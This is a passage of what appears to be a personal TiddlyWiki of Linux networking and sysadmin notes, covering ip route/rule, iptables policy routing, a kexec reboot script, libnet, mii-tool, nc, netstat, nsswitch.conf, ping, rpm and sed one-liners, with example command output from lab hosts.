127.0.0.0/8 dev lo  scope link 
default via 192.168.99.113 dev eth0
  
}}}

ip route get simulates a request for the specified destination, ip route get causes the routing selection algorithm to be run. When this is complete, it prints out the resulting path to the destination. In one sense, this is almost equivalent to sending an ICMP echo request packet and then using ip route show cache. 

{{{

# Testing routing tables with ip route get

[root@tristan]# ip -s route get 127.0.0.1/32
ip -s route get 127.0.0.1/32
local 127.0.0.1 dev lo  src 127.0.0.1 
    cache &lt;local&gt;  users 1 used 1 mtu 16436 advmss 16396
[root@tristan]# ip -s route get 127.0.0.1/32
local 127.0.0.1 dev lo  src 127.0.0.1 
    cache &lt;local&gt;  users 1 used 2 mtu 16436 advmss 16396

}}}


The flush option, when used with ip route empties a routing table or removes the route for a particular destination

{{{

# Removing a specific route and emptying a routing table with ip route flush

[root@masq-gw]# ip route flush
&quot;ip route flush&quot; requires arguments
[root@masq-gw]# ip route flush 10.38
Nothing to flush.
[root@masq-gw]# ip route flush 10.38.0.0/16
[root@masq-gw]# ip route show
192.168.100.0/30 dev eth3  scope link
205.254.211.0/24 dev eth1  scope link
192.168.100.0/24 dev eth0  scope link
192.168.99.0/24 dev eth0  scope link
192.168.98.0/24 via 192.168.99.1 dev eth0
127.0.0.0/8 dev lo  scope link 
default via 205.254.211.254 dev eth1
[root@masq-gw]# ip route flush table main
[root@masq-gw]# ip route show
[root@masq-gw]# 
 
}}}

Emptying the routing cache with ip route flush cache

{{{

[root@tristan]# ip route show cache
local 127.0.0.1 from 127.0.0.1 tos 0x10 dev lo 
    cache &lt;local&gt;  mtu 16436 advmss 16396
local 127.0.0.1 from 127.0.0.1 dev lo 
    cache &lt;local&gt;  mtu 16436 advmss 16396
192.168.100.17 from 192.168.99.35 via 192.168.99.254 dev eth0 
    cache  mtu 1500 rtt 18ms rttvar 15ms cwnd 15 advmss 1460
192.168.100.17 via 192.168.99.254 dev eth0  src 192.168.99.35 
    cache  mtu 1500 advmss 1460
[root@tristan]# ip route flush cache
[root@tristan]# ip route show cache
[root@tristan]# ip route show cache
local 127.0.0.1 from 127.0.0.1 tos 0x10 dev lo 
    cache &lt;local&gt;  mtu 16436 advmss 16396
local 127.0.0.1 from 127.0.0.1 dev lo 
    cache &lt;local&gt;  mtu 16436 advmss 16396

}}}

</pre>
</div>
<div title="ip rule" modifier="YourName" created="200807021032" changecount="1">
<pre>!ip rule

{{{

# Displaying the RPDB with ip rule show

[root@isolde]# ip rule show
0:      from all lookup local 
32766:  from all lookup main 
32767:  from all lookup 253
          

# Creating a simple entry in the RPDB with ip rule add  [58]

[root@masq-gw]# ip route add default via 205.254.211.254 table 8
[root@masq-gw]# ip rule add tos 0x08 table 8
[root@masq-gw]# ip route flush cache
[root@masq-gw]# ip rule show
0:      from all lookup local 
32765:  from all tos 0x08 lookup 8 
32766:  from all lookup main 
32767:  from all lookup 253



# Creating a complex entry in the RPDB with ip rule add

[root@masq-gw]# ip rule add from 192.168.100.17 tos 0x08 fwmark 4 table 7
          

# Creating a NAT rule with ip rule add nat

[root@masq-gw]# ip rule add nat 205.254.211.17 from 192.168.100.17
[root@masq-gw]# ip rule show
0:      from all lookup local 
32765:  from 192.168.100.17 lookup main map-to 205.254.211.17
32766:  from all lookup main 
32767:  from all lookup 253


# Creating a NAT rule for an entire network with ip rule add nat

[root@masq-gw]# ip rule add nat 205.254.211.32 from 192.168.100.32/29
[root@masq-gw]# ip rule show
0:      from all lookup local 
32765:  from 192.168.100.32/29 lookup main map-to 205.254.211.32
32766:  from all lookup main 
32767:  from all lookup 253
          

# Removing a NAT rule for an entire network with ip rule del nat

[root@masq-gw]# ip rule del nat 205.254.211.32 from 192.168.100.32/29
[root@masq-gw]# ip rule show
0:      from all lookup local 
32766:  from all lookup main 
32767:  from all lookup 253

}}}
</pre>
</div>
<div title="iptables" modifier="YourName" modified="200807020933" created="200807020853" changecount="10">
<pre>!Kernel Packet Hadling diagram
[img[images/kernel_net.png]]

!Packet Traversal for ~Non-Local Destination
* All of the PREROUTING netfilter hooks are called here. This means that we get our first opportunity to inspect and drop a packet, we can perform DNAT on the packet to make sure that the destination IP is rewritten before we make a routing decision (at which time the destination address becomes very important). We can also set ~ToS or an fwmark on the packet at this time. If we want to use an IMQ device for ingress control, we can put our hooks here.
* If we are using ipchains, the input chain is traversed.
* Any traffic control on the real device on which the packet arrived is now performed.
* The input routing stage is traversed by any packet entering the local machine. Here we concern ourselves only with packets which are routed through this machine to another destination Additionally, iproute2 NAT occurs here [36].
* The packet enters the FORWARD netfilter hooks. Here, the packet can be mangled with ~ToS or fwmark. After the mangle chain is passed, the filter chain will be traversed. For kernel 2.4-based routing devices this will be the location for packet filtering rules. If we are using ipchains, the forward chain would be traversed here instead of the netfilter FORWARD hooks.
* The output chain in an ipchains installation would be traversed here.
* The POSTROUTING netfilter hooks are traversed. These include packet mangling, NAT and IMQ for egress.
* Finally, the packet is transmitted via the outbound device per traffic control configuration on that outbound device. 

!Packet Traversal for Local Destination
* All of the PREROUTING netfilter hooks are called here. This means that we get our first opportunity to inspect and drop a packet, we can perform DNAT on the packet to make sure that the destination IP is rewritten before we make a routing decision (at which time the destination address becomes very important). We can also set ~ToS or an fwmark on the packet at this time. If we want to use an IMQ device for ingress control, we can put our hooks here.
* If we are using ipchains, the input chain is traversed.
* Any traffic control on the real device on which the packet arrived is now performed.
* The input routing stage is traversed by any packet entering the local machine. Here we concern ourselves with packets bound for local destinations only.
* The INPUT netfilter hooks are traversed. Commonly this is filtering for inbound connections, but can include packet mangling.
* The local destination process receives the connection. If there is no open socket, an error is generated. 

!Packet Traversal for Locally Generated
* The process with the open socket sends data.
* The routing decision is made. This is frequently called output routing because it is only for packets leaving the system. This routing code is (sometimes?) responsible for selecting the source IP of the outbound packet.
* The netfilter OUTPUT hooks are traversed. The basic filter, nat, and mangle hooks are available. This is where SNAT can take place.
* The output chain in an ipchains installation would be traversed here.
* The POSTROUTING netfilter hooks are traversed. These include packet mangling, NAT and IMQ for egress.
* Finally, the packet is transmitted via the outbound device per traffic control configuration on that outbound device. 

!Multiple Outbound Internet links
{{{
[root@masq-gw]# ip route show table main
192.168.100.0/30 dev eth3  scope link
67.17.28.0/28 dev eth4  scope link
205.254.211.0/24 dev eth1  scope link
192.168.100.0/24 dev eth0  scope link
192.168.99.0/24 dev eth0  scope link
192.168.98.0/24 via 192.168.99.1 dev eth0
10.38.0.0/16 via 192.168.100.1 dev eth3
127.0.0.0/8 dev lo  scope link 
default via 205.254.211.254 dev eth1
[root@masq-gw]# ip route flush table 4
[root@masq-gw]# ip route show table main | grep -Ev ^default  | while read ROUTE ; do  ip route add table 4 $ROUTE ; done
[root@masq-gw]# ip route add table 4 default via 67.17.28.14
[root@masq-gw]# ip route show table 4
192.168.100.0/30 dev eth3  scope link
67.17.28.0/28 dev eth4  scope link
205.254.211.0/24 dev eth1  scope link
192.168.100.0/24 dev eth0  scope link
192.168.99.0/24 dev eth0  scope link
192.168.98.0/24 via 192.168.99.1 dev eth0
10.38.0.0/16 via 192.168.100.1 dev eth3
127.0.0.0/8 dev lo  scope link 
default via 67.17.28.14 dev eth4
}}}

{{{
[root@masq-gw]# iptables -t mangle -A PREROUTING -p tcp --dport 80 -s 192.168.99.0/24 -j MARK --set-mark 4
[root@masq-gw]# iptables -t mangle -A PREROUTING -p tcp --dport 443 -s 192.168.99.0/24 -j MARK --set-mark 4
[root@masq-gw]# iptables -t mangle -nvL
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source                destination         
    0     0 MARK       tcp  --  *      *       192.168.99.0/24       0.0.0.0/0          tcp dpt:80 MARK set 0x4 
    0     0 MARK       tcp  --  *      *       192.168.99.0/24       0.0.0.0/0          tcp dpt:443 MARK set 0x4 

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
  pkts bytes target     prot opt in     out     source               destination
[root@masq-gw]# iptables -t nat -A POSTROUTING -o eth4 -j SNAT --to-source 67.17.28.12
[root@masq-gw]# iptables -t nat -A POSTROUTING -o eth1 -j SNAT --to-source 205.254.211.179
Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         

Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 SNAT       all  --  *      eth4    0.0.0.0/0            0.0.0.0/0          to:67.17.28.12
    0     0 SNAT       all  --  *      eth1    0.0.0.0/0            0.0.0.0/0          to:205.254.211.179

Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination
}}}

{{{
[root@masq-gw]# ip rule add fwmark 4 table 4
[root@masq-gw]# ip rule show
0:      from all lookup local 
32765:  from all fwmark        4 lookup 4 
32766:  from all lookup main 
32767:  from all lookup 253
[root@masq-gw]# ip route flush cache
}}}

With these iptables lines we have instructed netfilter to mark packets matching these criteria with the fwmark and we have prepared the NAT rules so that our outbound packets will originate from the correct ~IPs.

Once again, it is important to realize that the fwmark added to a packet is only valid and discernible while the packet is still on the host running the packet filter. The fwmark is stored in a data structure the kernel uses to track the packet. Because the fwmark is not a part of the packet itself, the fwmark is lost as soon as the packet has left the local machine.

iproute2 supports the use of fwmark as a selector for rule lookups, so we can use fwmarks in the routing policy database to cause packets to be conditionally routed based on that fwmark. This can lead to great complexity if a machine has multiple routing tables, packet filters, and other fancy networking tools, such as NAT or proxies. Caveat emptor.

A convention is to use the same number for a routing table and fwmark where possible. This simplifies the maintenance of the systems which are using iproute2 and fwmark, especially if the table identifier and fwmark are set in a configuration file with the same variable name. Since we are testing this on the command line, we'll just make sure that we can add the rules first.

</pre>
</div>
<div title="kexec reboot" modifier="BhargavaKancherla" created="200810170413" changecount="1">
<pre>A package called kexec can speed up your reboots.

The system is simple, and consists of two parts: a kexec-enabled kernel and the kexec-tools package. Most modern kernels already support kexec functionality. As for the second part, you can get the kexec-tools software either from your distribution's repositories or from the kexec project page.To check if the current kernel suports kexec or not
{{{
grep CONFIG_KEXEC=y /boot/config-`uname -r` &amp;&amp; echo yes || echo no
}}}

 When you load a new kernel by running kexec you are overwriting the existing kernel with the kernel you specify. While this has the effect of rebooting the system quickly, it also skips the process that resets all of your hardware to a &quot;clean&quot; state, which can have some unpredictable consequences depending on the hardware that you use. For example, the video card on my system is an old Nvidia GeForce2 Go, and I had been using the legacy driver from Nvidia for it. After using kexec to reboot, the video never worked correctly. When I switched to the open source driver, the video came up just fine. Outcomes like this may be as varied as the kinds of hardware that exist. You just need to be aware of the possibility of problems in case something happens that you don't expect.

You also need to know that kexec only reboots the kernel -- it does not take care of any cleanup such as shutting down applications or unmounting disks. We are going to set up a script that will take care of the whole process.

Sample script to use (in /etc/init.d/reboot ?)
{{{
do_stop () {

        UNAMER=`uname -r` # this checks the version of the kernel 

       #This just puts all of the parameters for loading in one place
	KPARAMS=&quot;-l &quot; # tells kexec to load the kernel

	# --append tells the kernel all of its parameters
	# cat /proc/cmdline gets the current kernel's command line
	KPARAMS=$KPARAMS&quot;--append=\&quot;`cat /proc/cmdline`\&quot; &quot;

	# this tells the kernel what initrd image to use
	KPARAMS=$KPARAMS&quot;--initrd=/boot/initrd.img-$UNAMER &quot;

	# this tells the kexec what kernel to load
	KPARAMS=$KPARAMS&quot;/boot/vmlinuz-$UNAMER&quot;
	
        # Message should end with a newline since kFreeBSD may
        # print more stuff (see #323749)
        log_action_msg &quot;Will now restart&quot;

        if [ -x `which kexec` ]; then # check for the kexec executable
                kexec $KPARAMS  # load the kernel with the correct parameters
                sync            # sync all of the disks so as not to lose data
                umount -a       # make sure all disks are unmounted
                kexec -e        # reboot the kernel
        fi

        #This next line should never happen.
        reboot -d -f -i
}
}}}
You want to load the new kernel with the current command line because it is not going to get a command line from a bootloader. Also, you have to use the vmlinuz image because kexec doesn't support compressed images. The sync command simply makes sure that all of the data that might be cached is written to the disk; remember, kexec doesn't care about the state of the disks, but if you boot a new kernel without properly handling the disks, you will run into problems. The umount -a command then makes sure that all of your disks are not open for business, and kexec -e reboots the computer.

Unless you have a driver issue you should be presented with your normal login when the system comes back up. If you aren't, you might be able to log in with SSH or a serial terminal and shut your system down properly. If not, you will probably have to hard boot. When you get control over your computer again, check all of the commands and their syntax -- you may have a typo. If not, you are probably looking at a driver issue. Look at /var/log/messages and the output of the dmesg command; they may give you a clue.


</pre>
</div>
<div title="libnet" modifier="YourName" modified="201003190826" created="201003190825" changecount="4">
<pre>For libnet related information refer

http://www.securityfocus.com/infocus/1386
http://repura.livejournal.com/23112.html
http://www.stanford.edu/~stinson/cs155/libnet/libnet_talk.ppt

Libnet(1.1.2) is a reasonably small programming library, written mainly in C, providing a high-level, standard portable interface to low-level network packet shaping, handling and injection primitives. Libnet allows you create ethernet/ip/tcp packets. It allows to create a packet at a time, send the packet, clear the existing packet and create a new packet. The upper level of libnet interface does not provide a way to operate on multiple packets at the same time. Header files are located in /usr/include/libnet.

!!!Steps in using libnet

* libnet_init to create a libnet_handle to a certain device.
{{{
libnet_t * libnet_init (int injection_type, char *device, char *err_buf)
}}}
** The device argument can be a device name, or NULL, or ip. The injection_type as in &quot;from the link layer up&quot; or &quot;from the network layer up&quot;. We'll use LIBNET_RAW4 (IPv4 and above) and LIBNET_LINK (link layer and above). err_buf is a string which will hold an error message if something goes wrong. The handle returned by this call maintains state for the entire session, tracks all memory usage and packet construction.

* Next step is to create headers(and payload) for the packet that we want to send.
{{{
      libnet_ptag_t libnet_build_tcp(u_int16_t sp, u_int16_t dp, u_int32_t seq, u_int32_t ack,
      u_int8_t control, u_int16_t win, u_int16_t sum, u_int16_t urg, u_int16_t len, u_int8_t *payload, u_int32_t payload_s, libnet_t *l, libnet_ptag_t ptag);
}}}
** This will allow you a tcp header and payload. Similarly libnet_build_ip and libnet_build_ethernet (optional) to create other protocol headers. The order of header creation should always be from top to bottom. i.e, always create tcp header before trying to create ip header, from the highest on the OSI model to the lowest. After you setup the headers, libnet_write can be used to write the data to the socket. Once the data has been written libnet_clear_packet can be used to clear the data structures for the existing packet and initialise a new packet. All of these functions operate on a libnet handle, which is acquired during libnet_init. There is no direct access to the actual packet that is sent.

* libnet_talk.ppt: libnet_talk.ppt </pre>
</div>
<div title="mii-tool" modifier="YourName" modified="200807021116" created="200807020958" changecount="3">
<pre>!mii-tool

Ethernet Port Speed Abbreviations
|!Port Speed	|!Description|
|10baseT-HD	|10 megabit half duplex|
|10baseT-FD	|10 megabit full duplex|
|100baseTx-HD	|100 megabit half duplex|
|100baseTx-FD	|100 megabit full duplex|

The raw number indicates the number of bits which can be exchanged between two Ethernet devices over the wire. So 10 megabit Ethernet can support the transmission of ten million bits per second. The suffix to each identifier indicates whether both hosts can send and receive simultaneously or not. Half duplex means that each device can either send or receive in the same instant. Full duplex means that both devices can send and receive simultaneously. 

{{{

# Detecting link layer status with mii-tool
[root@tristan]# mii-tool
eth0: negotiated 100baseTx-FD, link ok
[root@tristan]# mii-tool -v
eth0: negotiated 100baseTx-FD, link ok
  product info: vendor 08:00:17, model 1 rev 0
  basic mode:   autonegotiation enabled
  basic status: autonegotiation complete, link ok
  capabilities: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
  advertising:  100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD
  link partner: 100baseTx-FD 100baseTx-HD 10baseT-FD 10baseT-HD flow-control


# Specifying Ethernet port speeds with mii-tool --advertise
[root@tristan]# mii-tool mii-tool --advertise 10baseT-HD,10baseT-FD
restarting autonegotiation...
[root@tristan]# mii-tool
eth0: negotiated 10baseT-FD, link ok


# Forcing Ethernet port speed with mii-tool --force
[root@tristan]# mii-tool --force 10baseT-FD
[root@tristan]# mii-tool
eth0: 10 Mbit, full duplex, link ok
[root@tristan]# mii-tool --restart
restarting autonegotiation...
[root@tristan]# mii-tool
eth0: negotiated 100baseTx-FD, link ok

}}}

</pre>
</div>
<div title="nc" modifier="YourName" created="200807021036" changecount="1">
<pre>!nc

nc (pronounced net-cat). nc is one of a large number of tools for making a simple TCP connection. 

{{{
# Simple use of nc
[root@tristan]# nc 192.168.100.17 25
220 isolde ESMTP
quit
221 isolde


# Specifying timeout with nc
[root@tristan]# nc -w 5 192.168.98.82 22
         


# Specifying source address with nc
[root@masq-gw]# nc -s 192.168.99.254 192.168.47.3 25
        

# Using nc as a server
[root@tristan]# nc -l -p 2048
        

# Delaying a stream with nc
[root@tristan]# nc -l -p 2048
        

# Using nc with UDP
[root@tristan]# nc -u 192.168.100.17 3000

}}}

</pre>
</div>
<div title="netstat" modifier="YourName" modified="200807021102" created="200807021059" changecount="5">
<pre>!netstat
 One of the most common uses of the netstat  utility is to determine the state of sockets on a machine. There are many questions that netstat can answer with the right set of options. Here's a list of some of the things different things we can learn.

* which services are listening on which sockets
* what process (and controlling PID) is listening on a given socket
* whether data is waiting to be read on a socket
* what connections are currently established to which sockets 

By invoking netstat without any options, you are asking for a list of all currently open connections to and from the networking stack on the local machine. This means IP network connections, unix domain sockets, IPX sockets and Appletalk sockets among others.

A convenient feature of netstat is its ability to differentiate between two different sorts of name lookup. Normally the -n specifies no name lookup, but this is ambiguous when there are hostnames, port names, and user names. Fortunately, netstat offers the following options to differentiate the different forms of lookup and suppress only the [un-]desired lookup.

* {{{--numeric-hosts}}}
* {{{--numeric-ports}}}
* {{{--numeric-users}}}

The option -n, suppress all hostname, port name and username lookup, and is a synonym for {{{--numeric}}}. I'll reiterate that hostnames and DNS in particular can be confusing, or worse, misleading when trying to diagnose or debug a networking related issue, so it is wise to suppress hostname lookups in these sorts of situations. 

!!!Displaying IP socket status with netstat

{{{

[root@morgan]# netstat --inet -n
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0    192 192.168.98.82:22        192.168.99.35:40991     ESTABLISHED
tcp        0      0 192.168.98.82:42929     192.168.100.17:993      ESTABLISHED
tcp       96      0 127.0.0.1:40863         127.0.0.1:6010          ESTABLISHED
tcp        0      0 127.0.0.1:6010          127.0.0.1:40863         ESTABLISHED
tcp        0      0 127.0.0.1:38502         127.0.0.1:6010          ESTABLISHED
tcp        0      0 127.0.0.1:6010          127.0.0.1:38502         ESTABLISHED
tcp        0      0 192.168.98.82:53733     209.10.26.51:80         SYN_SENT
tcp        0      0 192.168.98.82:44468     192.168.100.17:993      ESTABLISHED
tcp        0      0 192.168.98.82:44320     192.168.100.17:139      TIME_WAIT
[root@morgan]# netstat --inet --numeric-hosts
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 192.168.98.82:ssh       192.168.99.35:40991     ESTABLISHED
tcp        0      0 192.168.98.82:42929     192.168.100.17:imaps    ESTABLISHED
tcp        0      0 127.0.0.1:40863         127.0.0.:x11-ssh-offset ESTABLISHED
tcp        0      0 127.0.0.:x11-ssh-offset 127.0.0.1:40863         ESTABLISHED
tcp        0      0 127.0.0.1:38502         127.0.0.:x11-ssh-offset ESTABLISHED
tcp        0      0 127.0.0.:x11-ssh-offset 127.0.0.1:38502         ESTABLISHED
tcp        0      0 192.168.98.82:53733     209.10.26.51:http       SYN_SENT
tcp        0      0 192.168.98.82:44468     192.168.100.17:imaps    ESTABLISHED
tcp        0      0 192.168.98.82:44320     192.168.100:netbios-ssn ~TIME_WAIT

}}}

netstat abbreviates the IP endpoint in order to reproduce the entire string retrieved from the port lookup (in /etc/services). Also interestingly, this line conveys to us (in the first output) that the kernel is waiting for the remote endpoint to acknowledge the 192 bytes which are still in the ~Send-Q buffer. 

The first line describes a TCP connection to the IP locally hosted on morgan's Ethernet interface. The connection was initiated from an ephemeral port (40991) on tristan to a service running on port 22. The service normally running on this well-known port is sshd, so we can conclude that somebody on tristan has connected to the morgan's ssh server. The second line describes a TCP session open to port 993 on isolde, which probably means that the user on morgan has an open connection to an IMAP over SSL server. 

The final line of our netstatoutput shows a connection in the ~TIME_WAIT state, which means that the TCP sessions have been terminated, but the kernel is waiting for any packets which may still be left on the network for this session. It is not at all abnormal for sockets to be in a ~TIME_WAIT state for a short period of time after a TCP session has ended. 

!!!Displaying IP socket status details with netstat

{{{

[root@masq-gw]# netstat -p -e --inet --numeric-hosts
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name   
tcp        0      0 192.168.100.254:ssh     192.168.100.17:49796    ESTABLISHED root       25453      6326/sshd
tcp        0    240 192.168.99.254:ssh      192.168.99.35:42948     ESTABLISHED root       171748     31535/sshd

}}}

!!!Possible Session States in netstat  output

|State	|Description|
|LISTEN	|accepting connections|
|ESTABLISHED	|connection up and passing data|
|~SYN_SENT	|TCP; session has been requested by us; waiting for reply from remote endpoint|
|~SYN_RECV	|TCP; session has been requested by a remote endpoint for a socket on which we were listening|
|~LAST_ACK	|TCP; our socket is closed; remote endpoint has also shut down; we are waiting for a final acknowledgement|
|~CLOSE_WAIT	|TCP; remote endpoint has shut down; the kernel is waiting for the application to close the socket|
|~TIME_WAIT	|TCP; socket is waiting after closing for any packets left on the network|
|CLOSED	| socket is not being used |
|CLOSING	|TCP; our socket is shut down; remote endpoint is shut down; not all data has been sent|
|~FIN_WAIT1	|TCP; our socket has closed; we are in the process of tearing down the connection|
|~FIN_WAIT2	|TCP; the connection has been closed; our socket is waiting for the remote endpoint to shut down|
</pre>
</div>
<div title="nsswitch" modifier="YourName" created="201006061850" changecount="1">
<pre>/etc/nsswitch.conf is used to configure the order in which a number of different sources are checked. You select the database you want to configure by specifying a keyword. For naming services, the database name is hosts. The possible sources for the hosts database are dns, nis, nisplus, and files (which refers to /etc/hosts in this case).
{{{
hosts:  dns files
}}}

By default, resolution moves from one source to the next (e.g., falls back to /etc/hosts from DNS) if the first source isn't available or the name being looked up isn't found. You can modify this behavior by specifying a condition and an action in square brackets between the sources. The possible conditions are: 

* UNAVAIL 
** The source hasn't been configured (in DNS's case, there is no resolv.conf file, and there is no nameserver running on the local host). 
* NOTFOUND 
** The source can't find the name in question (for DNS, the name looked up or the type of data looked up doesn't exist). 
* TRYAGAIN 
** The source is busy, but might respond next time (for example, the resolver has timed out while trying to look up a name). 
* SUCCESS 
** The requested name was found in the specified source. 

For each criterion, you can specify that the resolver should either continue and fall back to the next source or simply return. The default action is return for SUCCESS and continue for all the other conditions
{{{
hosts:  dns [NOTFOUND=return] files
}}}

</pre>
</div>
<div title="ping" modifier="BhargavaKancherla" modified="200807300535" created="200807021049" changecount="2">
<pre>!ping

{{{
# Using ping to specify number of packets to send
[root@morgan]# ping -c 10 -n 192.168.100.17


# Using ping to stress a network
[root@morgan]# ping -c 400 -f -n 192.168.99.254
PING 192.168.99.254 (192.168.99.254) from 192.168.98.82 : 56(84) bytes of data.
............
--- 192.168.99.254 ping statistics ---
411 packets transmitted, 400 packets received, 2% packet loss
round-trip min/avg/max/mdev = 37.840/62.234/97.807/12.946 ms
 

# Using ping to stress a network with large packets
[root@morgan]# ping -s 512 -c 400 -f -n 192.168.99.254
PING 192.168.99.254 (192.168.99.254) from 192.168.98.82 : 512(540) bytes of data.
............................................................................
................................................................
--- 192.168.99.254 ping statistics ---
551 packets transmitted, 400 packets received, 27% packet loss
round-trip min/avg/max/mdev = 47.854/295.711/649.595/153.345 ms


# Recording a network route with ping

[root@morgan]# ping -c 2 -n -R 192.168.99.35
PING 192.168.99.35 (192.168.99.35) from 192.168.98.82 : 56(124) bytes of data.
64 bytes from 192.168.99.35: icmp_seq=0 ttl=253 time=56.311 msec
RR:     192.168.98.82
        192.168.98.254
	192.168.99.1
	192.168.99.35
	192.168.99.35
	192.168.99.1
	192.168.98.254
	192.168.98.82

64 bytes from 192.168.99.35: icmp_seq=1 ttl=253 time=47.893 msec  (same route)

--- 192.168.99.35 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/mdev = 47.893/52.102/56.311/4.209 ms



# Setting the TTL on a ping packet

[root@morgan]# ping -c 1 -n -t 4 192.168.99.35
tcpdump: listening on eth0
02:02:04.679152 192.168.98.82 &gt; 192.168.99.35: icmp: echo request (DF)
02:02:04.711474 192.168.99.35 &gt; 192.168.98.82: icmp: echo reply
[root@morgan]# ping -c 1 -n -t 3 192.168.99.35
tcpdump: listening on eth0
02:01:50.810567 192.168.98.82 &gt; 192.168.99.35: icmp: echo request (DF)
02:01:50.841917 192.168.99.1 &gt; 192.168.98.82: icmp: time exceeded in-transit
          


# Setting ToS for a diagnostic ping

[root@wan-gw]# ping -c 2 -Q 8 -n 195.73.22.45
PING 195.73.22.45 (195.73.22.45) from 205.254.209.73 : 56(84) bytes of data.
64 bytes from 195.73.22.45: icmp_seq=0 ttl=252 time=51.633 msec
64 bytes from 195.73.22.45: icmp_seq=1 ttl=252 time=36.323 msec

--- 195.73.22.45 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/mdev = 36.323/43.978/51.633/7.655 ms
[root@wan-gw]# tcpdump -nni wan0 icmp
tcpdump: listening on wan0
21:55:37.983149 10.10.14.2 &gt; 10.10.22.254: icmp: echo request (DF) [tos 0x8] 
21:55:38.034770 10.10.22.254 &gt; 10.10.14.2: icmp: echo reply [tos 0x8] 
21:55:38.982277 10.10.14.2 &gt; 10.10.22.254: icmp: echo request (DF) [tos 0x8] 
21:55:39.018588 10.10.22.254 &gt; 10.10.14.2: icmp: echo reply [tos 0x8]
          

# Specifying a source address for ping

[root@masq-gw]# ping -c 2 -n -I 192.168.99.254 192.168.70.254
PING 192.168.70.254 (192.168.70.254) from 192.168.99.254 : 56(84) bytes of data.
64 bytes from 192.168.70.254: icmp_seq=0 ttl=254 time=69.285 msec
64 bytes from 192.168.70.254: icmp_seq=1 ttl=254 time=53.976 msec

--- 192.168.70.254 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/mdev = 53.976/61.630/69.285/7.658 ms
         

# Using ping to find the IPs of machines in a subnet

bhargava@bhargava:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:13:72:20:00:ba
          inet addr:10.216.50.132  Bcast:10.216.55.255  Mask:255.255.248.0
          inet6 addr: fe80::213:72ff:fe20:ba/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:787855 errors:0 dropped:0 overruns:0 frame:0
          TX packets:564986 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:645937667 (616.0 MB)  TX bytes:95729588 (91.2 MB)
          Interrupt:16
bhargava@bhargava:~$ ping -b -I eth0 10.216.55.255
WARNING: pinging broadcast address
PING 10.216.55.255 (10.216.55.255) from 10.216.50.132 eth0: 56(84) bytes of data.
64 bytes from 10.216.48.3: icmp_seq=1 ttl=255 time=3.31 ms
64 bytes from 10.216.48.2: icmp_seq=1 ttl=255 time=3.33 ms (DUP!)
64 bytes from 10.216.48.200: icmp_seq=1 ttl=64 time=22.6 ms (DUP!)
64 bytes from 10.216.50.1: icmp_seq=1 ttl=64 time=25.5 ms (DUP!)
64 bytes from 10.216.50.213: icmp_seq=1 ttl=64 time=27.3 ms (DUP!)
64 bytes from 10.216.51.130: icmp_seq=1 ttl=64 time=29.1 ms (DUP!)
64 bytes from 10.216.50.103: icmp_seq=1 ttl=64 time=29.8 ms (DUP!)
64 bytes from 10.216.51.121: icmp_seq=1 ttl=64 time=31.6 ms (DUP!)
64 bytes from 10.216.50.25: icmp_seq=1 ttl=64 time=33.2 ms (DUP!)
64 bytes from 10.216.50.149: icmp_seq=1 ttl=64 time=34.3 ms (DUP!)
64 bytes from 10.216.48.168: icmp_seq=1 ttl=64 time=34.8 ms (DUP!)
64 bytes from 10.216.48.10: icmp_seq=1 ttl=255 time=59.0 ms (DUP!)

--- 10.216.55.255 ping statistics ---
1 packets transmitted, 1 received, +11 duplicates, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.317/27.866/59.061/13.996 ms
bhargava@bhargava:~$


}}}
</pre>
</div>
<div title="proc /proc" modifier="YourName" created="201003190823" changecount="1">
<pre>http://www.linuxinsight.com/proc_filesystem.html'</pre>
</div>
<div title="rpm" modifier="YourName" modified="201102280612" created="201006070555" changecount="2">
<pre>!Extracing a rpm
{{{
rpm2cpio myrpmfile.rpm | cpio -idmv
}}}

!Listing files in a rpm file
{{{
rpm -qpl file.rpm 
}}}

!Extracting source from a rpm
Install source rpm, which will create files in /usr/src/packages/SOURCES (patches) and /usr/src/packages/BUILD
rpmbuild &lt;specfile&gt; (in SPECS directory) to apply patches/build from source.
</pre>
</div>
<div title="sed Tips" modifier="YourName" modified="200902221508" created="200901131638" changecount="3">
<pre>-------------------------------------------------------------------------
HANDY ONE-LINERS FOR SED (Unix stream editor)               Apr. 26, 2004
compiled by Eric Pement - pemente[at]northpark[dot]edu        version 5.4
Latest version of this file is usually at:
   http://sed.sourceforge.net/sed1line.txt
   http://www.student.northpark.edu/pemente/sed/sed1line.txt

Explanation of the options available at 
http://www.catonmat.net/blog/sed-one-liners-explained-part-one/
http://www.catonmat.net/blog/sed-one-liners-explained-part-two/
http://www.catonmat.net/blog/sed-one-liners-explained-part-three/
{{{
FILE SPACING:

 # double space a file
 sed G

 # double space a file which already has blank lines in it. Output file
 # should contain no more than one blank line between lines of text.
 sed '/^$/d;G'

 # triple space a file
 sed 'G;G'

 # undo double-spacing (assumes even-numbered lines are always blank)
 sed 'n;d'

 # insert a blank line above every line which matches &quot;regex&quot;
 sed '/regex/{x;p;x;}'

 # insert a blank line below every line which matches &quot;regex&quot;
 sed '/regex/G'

 # insert a blank line above and below every line which matches &quot;regex&quot;
 sed '/regex/{x;p;x;G;}'

NUMBERING:

 # number each line of a file (simple left alignment). Using a tab (see
 # note on '\t' at end of file) instead of space will preserve margins.
 sed = filename | sed 'N;s/\n/\t/'

